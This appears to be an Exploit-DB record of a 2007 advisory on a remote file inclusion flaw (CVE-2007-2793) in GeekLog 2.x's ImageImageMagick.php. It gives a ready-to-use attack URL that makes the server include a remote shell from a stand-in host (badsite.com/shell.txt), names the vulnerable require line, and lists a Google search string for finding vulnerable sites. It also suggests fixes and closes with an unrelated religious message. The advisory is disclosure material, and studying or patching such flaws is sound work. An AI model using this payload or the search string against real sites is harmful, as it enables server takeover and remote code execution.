{
  "id": "3946",
  "title": "GeekLog 2.x - &#039;ImageImageMagick.php&#039; Remote File Inclusion",
  "cve": "CVE-2007-2793",
  "vuln_type": "unknown",
  "code": "--------------------------------[ 05/18/2007 ]---------------------------------\r\n\r\nGeekLog 2.* (ImageImageMagick.php) RFI Vuln\r\n\r\n-----------------------------------[ ASCII ]-----------------------------------\r\n\r\n     ##                             ###        # ###                           \r\n      ##    #                        ###     /  /###                           \r\n      ##   ###                        ##    /  /  ###                          \r\n      ##    #                         ##   /  ##   ###  ##                     \r\n      ##                              ##  /  ##    #### ##                     \r\n  ### ##  ###       /##       /###    ## ##       ## ##  ##    ###    ####     \r\n ######### ###     / ###     / #### / ## ##      ##  ##   ##    ###     ###  / \r\n##   ####   ##    /   ###   ##  ###/  ## ##      ##  ##   ##     ###     ###/  \r\n##    ##    ##   ##    ### ####       ## ##     ##   ##   ##      ##      ##   \r\n##    ##    ##   ########    ###      ## ##    ##    ##   ##      ##      ##   \r\n##    ##    ##   #######       ###    ##  ##  ##     ##   ##      ##      ##   \r\n##    ##    ##   ##              ###  ##   ## #      /    ##      ##      ##   \r\n##    /#    ##   ####    /  /###  ##  ##    ###     /     ##      /#      /    \r\n ####/      ### / ######/  / #### /   ### /  ######/       ######/ ######/     \r\n  ###        ##/   #####      ###/     ##/     ###          #####   #####      \r\n                                                        -dsd863 [at] yahoo.com-                         \r\n---------------------------------[ Contacts ]---------------------------------\r\n\r\n\t\t\t\tdiesl0w @ UnderNET\r\n\t\t#hackphreak #oldskewl #ubergeeks #linux.edu #linuxhq\r\n\r\n----------------------------------[ Credit ]----------------------------------\r\n\r\nrgod <rgod [at] autistici.org> for his original BaseView.php RFI find\r\n\r\n---------------------------------[ Download ]---------------------------------\r\n\r\nhttp://www.geeklog.net/nightly/geeklog2-cvs-nightly.tar.gz\r\n\r\n---------------------------------[ Vuln Code ]--------------------------------\r\n\r\n[geeklog path]/system/ImageImageMagick.php?glConf[path_system]=http://www.badsite.com/shell.txt?\r\n\r\n\r\n-----------------------------------[ Issue ]----------------------------------\r\n\r\n-Line 3 of ImageImageMagick.php-\r\n\r\nrequire $glConf['path_system'] . 'BaseImage.php';\r\n\r\n-----------------------------------[ Google ]----------------------------------\r\n\r\n\"Powered By Geeklog\"\r\n\r\n----------------------------------[ Solution ]---------------------------------\r\nChange php.ini and set allow_url_fopen to Off\r\n(Not tested but disabling URL-Access will fix the issue)\r\n\r\nor\r\n\r\nInsert the following code before line 3:\r\n\r\nAdd the following code:\r\n\r\nif (strpos ($_SERVER['PHP_SELF'], 'ImageImageMagick.php') !== false){ die('Cant access file by itself.'); }\r\n\r\n----------------------------[ Word from my sponsor ]---------------------------\r\n\r\nNon-Christians: We were born sinners in need of a fix. Without Jesus as a we are going to hell. point blank\r\nChristians: Keep passing the faith. Crucify yourself daily. When you fall, get back up.\r\n\r\nRomans 3:23\r\n\"for all have sinned and fall short of the glory of God\"\r\n\r\nRomans 6:23\r\n\"For the wages of sin is death, but the gift of God is eternal life through Jesus Christ our Lord.\"\r\n\r\nRomans 10:9\r\n\"That if you confess with your mouth, \"Jesus is Lord,\" and believe in your heart that God raised him from the dead, you will be saved.\"\r\n\r\n# milw0rm.com [2007-05-17]",
  "url": "https://www.exploit-db.com/exploits/3946"
}